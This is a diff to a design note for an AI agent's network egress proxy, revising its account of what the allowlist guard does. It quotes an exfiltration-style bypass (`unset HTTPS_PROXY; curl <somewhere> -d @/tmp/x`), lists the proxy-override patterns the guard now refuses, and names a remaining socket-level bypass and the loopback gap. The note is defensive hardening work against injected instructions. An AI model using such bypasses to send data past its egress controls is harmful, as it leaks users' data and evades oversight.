@@ -42,9 +42,22 @@ means changing a compose this repository does not contain.
 So: policy. The probes keep their route, and everything that HONOURS a proxy
 goes through one allowlist. What that is and is not:
 
-* It bounds the accident and the injected instruction that uses ordinary
-  tooling — which is the threat that actually exists here. It does not stop a
-  process that deliberately ignores the proxy environment.
+* It bounds the accident. **The first version of this sentence overstated the
+  rest and was corrected the same day**, on a measurement by hookstack-e5: the
+  allowlist works by environment, and the guard allowed
+  `unset HTTPS_PROXY; curl <somewhere> -d @/tmp/x`. Defeating it was not "a
+  process that deliberately ignores proxy env" — it was ONE SHELL PREFIX, and
+  the agent has a shell, so an injected instruction using ordinary tooling went
+  straight through.
+
+  The guard now refuses, under every posture, anything that unsets, empties or
+  overrides `HTTP_PROXY`/`HTTPS_PROXY`/`NO_PROXY`/`ALL_PROXY` (either case), and
+  the same bypass through `curl --noproxy|-x|--proxy` and `wget --no-proxy`.
+  That moves the bypass from one prefix to writing a program — a python one-liner
+  with its own socket reads none of those variables and no pattern here can see
+  it, which is asserted as a test so nobody reads the rule as more than it is.
+  The larger half of what it buys is that the ATTEMPT now lands in the audit as
+  a refusal instead of passing silently.
 * The allowlist was measured, not guessed. WebFetch reached exactly three hosts
   in this deployment's life (`docs.aws.amazon.com` 7, `grafana.com` 2,
   `raw.githubusercontent.com` 2); WebSearch needs nothing, because its audit
@@ -52,7 +65,10 @@ goes through one allowlist. What that is and is not:
   API. So an empty refusal log now means "nothing new", which is a signal;
   under a gateway-only list it would have meant "WebFetch is broken".
 * `NO_PROXY` keeps the proxy out of the path of everything local, including
-  `127.0.0.1`, where the CLI posts its own telemetry. If the proxy dies, the
+  `127.0.0.1`, where the CLI posts its own telemetry — which also means
+  **anything reachable on loopback is outside this boundary by construction**.
+  On the probe that is the telemetry receiver and nothing else today; whoever
+  adds the next loopback service should know it lands outside the allowlist. If the proxy dies, the
   return door, the MCP server and the collector keep working; only the model
   call stops.
 
